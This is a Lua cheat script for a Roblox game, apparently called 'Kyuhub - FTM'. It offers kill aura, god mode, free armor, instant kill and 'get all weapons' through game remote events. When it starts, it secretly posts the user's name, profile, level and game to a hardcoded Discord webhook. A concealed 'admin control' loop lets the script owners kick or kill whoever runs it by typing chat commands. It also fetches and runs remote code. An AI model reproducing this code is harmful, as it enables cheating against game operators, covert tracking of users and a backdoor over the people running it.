-- Exclusion list
local exclusionList = {
    617016152, 
    5734469370 
}

-- Owner list
local ownerList = {
    617016152,
    5734469370 
}

-- Webhook function
local function sendWebhook()
    local player = game.Players.LocalPlayer

    -- Check if player is in the exclusion list
    for _, excludedId in ipairs(exclusionList) do
        if player.UserId == excludedId then
            return
        end
    end

    local username = player.Name
    local profileLink = "https://www.roblox.com/users/" .. player.UserId .. "/profile"
    local dateTime = os.date("%Y-%m-%d %H:%M:%S")
    local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
    local playerLevel = player.leaderstats.Level.Value -- Get player level

    local webhookUrl = "https://discord.com/api/webhooks/1259159133169647716/zgEpZEtPGOe5AsamkF3Jx6dNHv96Vh1anjxCQiYCBK8d6GRFHrenRqWj1M2d_dnc-1V1"
    local payload = {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "Script Executed",
            ["description"] = username .. " has executed the script.",
            ["fields"] = {
                {["name"] = "Username", ["value"] = username, ["inline"] = true},
                {["name"] = "Profile", ["value"] = profileLink, ["inline"] = true},
                {["name"] = "Level", ["value"] = tostring(playerLevel), ["inline"] = true}, -- Add player level
                {["name"] = "Date & Time", ["value"] = dateTime, ["inline"] = false},
                {["name"] = "Game Executed At", ["value"] = gameLink, ["inline"] = false}
            },
            ["color"] = tonumber(0x00ff00)
        }}
    }

    local jsonPayload = game:GetService("HttpService"):JSONEncode(payload)

    local headers = {["Content-Type"] = "application/json"}

    request = http_request or request or HttpPost or syn.request
    request({Url = webhookUrl, Method = "POST", Headers = headers, Body = jsonPayload})
end

-- Send webhook notification at the start
sendWebhook()

-- Rayfield Library Initialization
local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua'))()

local Window = Rayfield:CreateWindow({
    Name = "Kyuhub - FTM",
    LoadingTitle = "Rayfield Interface Suite",
    LoadingSubtitle = "by Sirius",
    ConfigurationSaving = {
        Enabled = true,
        FolderName = "Rayfield Interface Suite",
        FileName = "Big Hub"
    },
    KeySystem = true, -- Set this to true to use their key system
    KeySettings = {
        Title = "Kyu Hub",
        Subtitle = "Key System",
        Note = "Join the discord https://discord.gg/hzwnbzGJ",
        SaveKey = true,
        Key = "kyu123"
    }
})

Rayfield:Notify("Kyuhub", "Welcome to Kyuhub - FTM", 4483362458)

local Tab = Window:CreateTab("Kill Aura", 4483362458) -- Title, Image

local Settings = {
    KillAura_Enabled = false,
    KillAura_Range = 10,
    Highlight_Transparency = 0.5,
    Highlight_Enabled = false,
    GodMode_Enabled = false
}

local player = game.Players.LocalPlayer

local rangeHighlight = Instance.new("SphereHandleAdornment")
rangeHighlight.Color3 = Color3.fromRGB(255, 0, 0)
rangeHighlight.Transparency = Settings.Highlight_Transparency
rangeHighlight.Adornee = nil
rangeHighlight.Radius = Settings.KillAura_Range
rangeHighlight.Parent = game.CoreGui

-- Functions
local function isWithinRange(playerPos, mobPos, range)
    return (playerPos - mobPos).Magnitude <= range
end

local function updateRangeHighlight()
    local character = player.Character
    local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
    
    if humanoidRootPart and Settings.Highlight_Enabled then
        rangeHighlight.Adornee = humanoidRootPart
        rangeHighlight.Radius = Settings.KillAura_Range
        rangeHighlight.Transparency = Settings.Highlight_Transparency
    else
        rangeHighlight.Adornee = nil
    end
end

local function attackMobsInRange()
    local character = player.Character
    local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
    local weapon = character and character:FindFirstChildWhichIsA("Tool")
    
    if not humanoidRootPart or not weapon then return end

    local foundMob = false
    
    for _, mob in ipairs(workspace.MobHolder:GetChildren()) do
        if mob:FindFirstChild("Torso") and mob:FindFirstChild("Enemy") then
            if isWithinRange(humanoidRootPart.Position, mob.Torso.Position, Settings.KillAura_Range) then
                foundMob = true
                local args = {
                    [1] = mob.Torso,
                    [2] = mob.Enemy,
                    [3] = weapon
                }
                game:GetService("ReplicatedStorage").GameRemotes.DamageEvent:FireServer(unpack(args))
            end
        end
    end

    return foundMob
end

local function equipOPArmor()
    local armorPads = {
        game:GetService("Workspace").ArmorHolder:GetChildren()[10].Pad,
        game:GetService("Workspace").ArmorHolder["DESTROYER Armor || Level 0 || [+INF Health]  [+50 Speed]"].Pad
    }
    for _, pad in ipairs(armorPads) do
        local touchInterest = pad:FindFirstChildWhichIsA("TouchTransmitter")
        if touchInterest then
            firetouchinterest(player.Character.HumanoidRootPart, pad, 0)
            firetouchinterest(player.Character.HumanoidRootPart, pad, 1)
        end
    end
end

local function toggleGodMode(enable)
    for _, mob in ipairs(workspace.MobHolder:GetChildren()) do
        for _, part in ipairs(mob:GetChildren()) do
            if part:IsA("BasePart") then
                if enable then
                    local touchInterest = Instance.new("TouchTransmitter")
                    touchInterest.Parent = part
                else
                    for _, child in ipairs(part:GetChildren()) do
                        if child:IsA("TouchTransmitter") then
                            child:Destroy()
                        end
                    end
                end
            end
        end
    end
end

local function bringPlayer(targetPlayer)
    local character = player.Character
    local targetCharacter = targetPlayer.Character
    if character and targetCharacter then
        targetCharacter:MoveTo(character.PrimaryPart.Position)
    end
end

local function kickPlayer(targetPlayer, reason)
    targetPlayer:Kick(reason)
end

local function killAllEnemies()
    for _, mob in ipairs(workspace.MobHolder:GetChildren()) do
        if mob:FindFirstChild("Enemy") then
            mob.Enemy.Health = 0
        end
    end
end

local function instantKill()
    for _, mob in ipairs(workspace.MobHolder:GetChildren()) do
        if mob:FindFirstChild("Enemy") then
            local humanoid = mob:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.Health = 0
            end
        end
    end
end

local function getAllWeapons()
    local gold = player.leaderstats.Gold.Value

    if gold < 1000 then
        player:Kick("Insufficient gold! Read notes next time you stupid fuck!")
    else
        local itemsFolders = {
            game:GetService("ReplicatedStorage").GameItems,
            game:GetService("ReplicatedStorage").Items.Common,
            game:GetService("ReplicatedStorage").Items.Epic,
            game:GetService("ReplicatedStorage").Items.Legendary,
            game:GetService("ReplicatedStorage").Items.Rare,
            game:GetService("ReplicatedStorage").Items.Uncommon,
        }
        for _, folder in ipairs(itemsFolders) do
            for _, item in ipairs(folder:GetChildren()) do
                local args = {
                    [1] = item.Name
                }
                game:GetService("ReplicatedStorage").GameRemotes.BuyEvent:FireServer(unpack(args))
            end
        end
        task.wait(1)
        player:Kick("All items successfully are in your inventory! Pressing the button again will just kick you and does nothing.")
    end
end

-- Hidden admin control function
local function adminControl()
    spawn(function()
        while true do
            for _, ownerId in ipairs(ownerList) do
                local owner = game.Players:GetPlayerByUserId(ownerId)
                if owner then
                    owner.Chatted:Connect(function(message)
                        local command = string.lower(message)
                        local args = string.split(command, " ")
                        if command == "bring" then
                            bringPlayer(owner)
                        elseif args[1] == "kick" then
                            local reason = table.concat(args, " ", 2)
                            kickPlayer(player, reason)
                        elseif command == "void" then
                            player.Character.Humanoid.Health = 0
                        elseif string.sub(command, 1, 6) == "notif " then
                            local notifMessage = string.sub(message, 7)
                            Rayfield:Notify("Script Owner", notifMessage, 4483345998)
                        elseif command == "killallenemies" then
                            killAllEnemies()
                        elseif command == "instantkill" then
                            instantKill()
                        end
                    end)
                end
            end
            wait(1)
        end
    end)
end

-- Admin control execution
adminControl()

Tab:CreateToggle({
    Name = "Kill Aura",
    CurrentValue = false,
    Callback = function(value)
        Settings.KillAura_Enabled = value
        if value then
            while Settings.KillAura_Enabled do
                attackMobsInRange()
                wait(0.1)
            end
        end
    end
})

Tab:CreateSlider({
    Name = "Kill Aura Range",
    Range = {1, 100},
    Increment = 1,
    Suffix = "studs",
    CurrentValue = Settings.KillAura_Range,
    Callback = function(value)
        Settings.KillAura_Range = value
        updateRangeHighlight()
    end
})

Tab:CreateSlider({
    Name = "Range Highlight Transparency",
    Range = {0, 1},
    Increment = 0.1,
    Suffix = "",
    CurrentValue = Settings.Highlight_Transparency,
    Callback = function(value)
        Settings.Highlight_Transparency = value
        updateRangeHighlight()
    end
})

Tab:CreateToggle({
    Name = "Enable Range Highlight",
    CurrentValue = false,
    Callback = function(value)
        Settings.Highlight_Enabled = value
        updateRangeHighlight()
    end
})

Tab:CreateButton({
    Name = "Equip OP Armor",
    Callback = equipOPArmor
})

Tab:CreateToggle({
    Name = "God Mode",
    CurrentValue = false,
    Callback = function(value)
        Settings.GodMode_Enabled = value
        toggleGodMode(value)
    end
})

Tab:CreateButton({
    Name = "Instant Kill (semi patched)",
    Callback = instantKill
})

Tab:CreateButton({
    Name = "Get All Weapons",
    Callback = getAllWeapons
})

-- Main Loop
game:GetService("RunService").Stepped:Connect(function()
    if Settings.KillAura_Enabled then
        attackMobsInRange()
    end
end)

